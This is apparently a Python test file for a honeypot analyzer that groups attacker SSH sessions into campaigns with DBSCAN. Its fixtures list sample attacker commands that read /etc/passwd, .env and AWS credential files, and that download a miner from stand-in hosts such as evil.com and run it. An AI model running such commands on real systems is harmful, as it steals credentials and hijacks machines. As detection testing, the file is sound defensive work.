"""Тесты модуля кластеризации сессий и выявления кампаний через DBSCAN."""
from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

from honeymind.analyzer import Analyzer
from honeymind.api import create_app
from honeymind.clustering import SessionClusterer, extract_session_profile


def test_pairwise_distance_same_signature_different_ips():
    clusterer = SessionClusterer()
    s1 = extract_session_profile({
        "session_id": "sess-1",
        "src_ip": "185.220.101.5",
        "commands": ["uname -a", "cat /etc/passwd", "cat /.env"],
        "techniques": ["T1082", "T1552.001"],
        "threat_score": 85,
        "ssh_client": "ssh-2.0-Go",
    })
    s2 = extract_session_profile({
        "session_id": "sess-2",
        "src_ip": "45.142.214.8",  # Совсем другой IP (прокси/бот)
        "commands": ["uname -a", "cat /etc/passwd", "cat /.env"],
        "techniques": ["T1082", "T1552.001"],
        "threat_score": 85,
        "ssh_client": "ssh-2.0-Go",
    })
    s_diff = extract_session_profile({
        "session_id": "sess-3",
        "src_ip": "91.200.12.1",
        "commands": ["curl http://evil.com/miner.sh", "chmod +x miner.sh", "./miner.sh"],
        "techniques": ["T1105", "T1222.002", "T1496"],
        "threat_score": 90,
        "ssh_client": "curl/7.81.0",
    })

    # Одинаковый почерк -> очень маленькая дистанция
    d_same = clusterer.pairwise_distance(s1, s2)
    assert d_same < 0.20

    # Разный почерк -> большая дистанция
    d_diff = clusterer.pairwise_distance(s1, s_diff)
    assert d_diff > 0.60


def test_cluster_two_distinct_campaigns_and_noise():
    clusterer = SessionClusterer(eps=0.40, min_samples=2)

    # Кампания 1: Кража креденшелов (3 сессии с 3 разных IP)
    c1_sessions = [
        {
            "session_id": f"c1-{i}",
            "src_ip": f"195.10.1.{i}",
            "commands": ["uname -a", "cat /etc/passwd", "cat /root/.aws/credentials"],
            "techniques": ["T1082", "T1552.001"],
            "threat_score": 92,
            "ssh_client": "ssh-2.0-Go",
        }
        for i in range(1, 4)
    ]

    # Кампания 2: Загрузка и запуск майнера (3 сессии с 3 других IP)
    c2_sessions = [
        {
            "session_id": f"c2-{i}",
            "src_ip": f"45.20.2.{i}",
            "commands": ["wget http://pool.evil/m.sh -O /tmp/m.sh", "chmod +x /tmp/m.sh", "nohup /tmp/m.sh &"],
            "techniques": ["T1105", "T1222.002", "T1059.004", "T1496"],
            "threat_score": 88,
            "ssh_client": "libssh-0.9.5",
        }
        for i in range(1, 4)
    ]

    # Шум: одиночная безобидная сессия
    noise_session = {
        "session_id": "noise-1",
        "src_ip": "8.8.8.8",
        "commands": ["ls", "pwd", "date"],
        "techniques": [],
        "threat_score": 5,
        "ssh_client": "OpenSSH_8.9",
    }

    all_sessions = c1_sessions + c2_sessions + [noise_session]
    result = clusterer.cluster_sessions(all_sessions)

    # Должно быть ровно 2 кампании
    campaigns = result["campaigns"]
    assert len(campaigns) == 2

    # Проверяем кампании
    c_counts = sorted([c["sessions_count"] for c in campaigns])
    assert c_counts == [3, 3]

    # Каждая кампания содержит уникальные IP
    for c in campaigns:
        assert len(c["unique_ips"]) == 3
        assert len(c["session_ids"]) == 3
        assert c["confidence"] >= 0.70
        assert "Campaign #" in c["title"]
        assert c["recommended_action"]

    # Одиночная сессия отсеяна как шум
    assert result["noise_sessions_count"] == 1
    assert "noise-1" in result["noise_session_ids"]
    assert result["total_sessions"] == 7


def test_empty_and_sub_minimum_sessions():
    clusterer = SessionClusterer(min_samples=2)
    # 0 сессий
    res_empty = clusterer.cluster_sessions([])
    assert res_empty["campaigns"] == []
    assert res_empty["total_sessions"] == 0

    # 1 сессия (меньше min_samples)
    res_one = clusterer.cluster_sessions([{"session_id": "single", "src_ip": "1.2.3.4", "commands": ["id"]}])
    assert res_one["campaigns"] == []
    assert res_one["noise_sessions_count"] == 1
    assert res_one["noise_session_ids"] == ["single"]


def test_cluster_campaigns_api_endpoint():
    app = create_app(Analyzer())
    client = TestClient(app)

    payload = {
        "sessions": [
            {
                "session_id": "api-s1",
                "src_ip": "100.1.1.1",
                "commands": ["uname -a", "cat /.env"],
                "techniques": ["T1082", "T1552.001"],
            },
            {
                "session_id": "api-s2",
                "src_ip": "100.1.1.2",
                "commands": ["uname -a", "cat /.env"],
                "techniques": ["T1082", "T1552.001"],
            },
        ],
        "eps": 0.45,
        "min_samples": 2,
    }

    resp = client.post("/cluster/campaigns", json=payload)
    assert resp.status_code == 200
    data = resp.json()
    assert len(data["campaigns"]) == 1
    c = data["campaigns"][0]
    assert c["sessions_count"] == 2
    assert c["unique_ips"] == ["100.1.1.1", "100.1.1.2"]
    assert any(t["technique"] == "T1552.001" for t in c["common_techniques"])
